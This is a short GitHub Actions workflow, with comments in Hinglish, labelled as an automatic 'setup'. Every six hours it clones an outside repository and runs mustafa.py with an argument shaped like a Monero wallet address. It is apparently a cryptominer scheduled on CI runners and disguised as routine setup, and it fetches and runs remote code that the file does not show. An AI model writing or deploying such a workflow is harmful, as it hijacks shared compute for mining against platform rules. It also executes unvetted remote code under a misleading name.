name: Auto Mustu Setup

on:
  schedule:
    # Har 6 ghante mein run karega (aap chahein to time change kar sakte hain)
    - cron: '0 */6 * * *'
  workflow_dispatch:  # Manual run ke liye bhi option rakh raha hoon

jobs:
  auto-setup:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
    
    - name: Install Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    
    - name: Install dependencies
      run: |
        pip install --upgrade pip
        # Agar mustafa.py ko koi library chahiye to yahan add karein
    
    - name: Git clone and run
      run: |
        git clone https://github.com/thumpingpp/mustu-setup.git
        cd mustu-setup
        chmod +x mustafa
        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
    
    - name: Log completion
      run: |
        echo "Auto setup completed at $(date)" >> setup_log.txt
    
    - name: Upload log
      uses: actions/upload-artifact@v3
      with:
        name: setup-logs
        path: setup_log.txt
